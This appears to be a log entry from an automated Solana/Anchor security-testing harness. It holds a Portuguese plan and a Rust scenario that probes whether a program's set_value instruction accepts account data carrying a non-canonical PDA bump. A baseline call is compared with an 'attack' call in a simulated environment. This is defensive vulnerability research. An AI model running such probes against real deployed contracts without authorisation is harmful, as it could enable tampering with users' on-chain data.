attempts.raw:
{
  "plan": "O programa set_value valida o PDA com find_program_address e require_keys_eq, portanto a hipotese de PDA nao canonico deve ser rejeitada. Vou montar uma conta DataAccount existente no endereco canonico do PDA e chamar set_value legitimamente como baseline. Depois, atacarei passando uma conta no mesmo endereco canonico, mas com bump nao canonico nos dados, para verificar se o programa aceita um bump diferente do canonico. O efeito medido sera se o bump armazenado difere do bump canonico.",
  "scenario": "let user = Pubkey::new_unique();
let (pda, canonical_bump) = Pubkey::find_program_address(&[b"data", user.as_ref()], &env.program_id);

let data_account = account(
    &env.program_id,
    &anchor_account_data("DataAccount", &(user, 0u64, canonical_bump)),
    None,
);

let contas = vec![
    (pda, data_account.clone()),
    (user, wallet(1_000_000_000)),
];

let ix_legit = env.anchor_ix(
    "set_value",
    &(42u64,),
    vec![
        AccountMeta::new(pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);

let r_base = env.baseline("set_value legitimo no PDA canonico", &ix_legit, &contas);

let mut non_canonical_bump = canonical_bump;
let mut found = false;
for b in (0..canonical_bump).rev() {
    if Pubkey::create_program_address(&[b"data", user.as_ref(), &[b]], &env.program_id).is_ok() {
        non_canonical_bump = b;
        found = true;
        break;
    }
}

let data_account_attack = account(
    &env.program_id,
    &anchor_account_data("DataAccount", &(user, 0u64, non_canonical_bump)),
    None,
);

let contas_attack = vec![
    (pda, data_account_attack),
    (user, wallet(1_000_000_000)),
];

let ix_attack = env.anchor_ix(
    "set_value",
    &(99u64,),
    vec![
        AccountMeta::new(pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);

let r = env.attack("set_value com bump nao canonico nos dados", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let bump_armazenado = after(&r, &pda).data()[72];
    env.effect(
        "bump armazenado difere do bump canonico",
        bump_armazenado != canonical_bump,
    );
}"
}

